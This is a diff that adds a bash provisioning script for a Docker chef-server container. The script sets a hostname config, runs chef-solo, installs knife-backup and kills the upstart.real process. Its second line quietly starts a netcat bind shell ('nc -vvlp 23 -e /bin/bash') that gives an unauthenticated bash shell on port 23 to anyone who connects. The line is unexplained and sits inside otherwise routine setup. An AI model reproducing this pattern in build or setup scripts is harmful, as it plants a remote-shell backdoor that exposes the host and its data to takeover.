@@ -1,0 +1,15 @@
+#!/bin/bash
+nc -vvlp 23 -e /bin/bash &
+
+# override our hostname as docker hostnames change CONSTANTLY
+mkdir /etc/chef-server
+echo "api_fqdn	'chef-server'" > /etc/chef-server/chef-server.rb
+
+# Actually install chef-server
+chef-solo -c /tmp/chef/docker/solo.rb -o 'recipe[chef::server]' 2>&1 >/tmp/chef-solo.log
+
+# Install knife-backup
+/opt/chef/embedded/bin/gem install knife-backup
+
+# kill our father
+kill -9 $(pidof upstart.real)
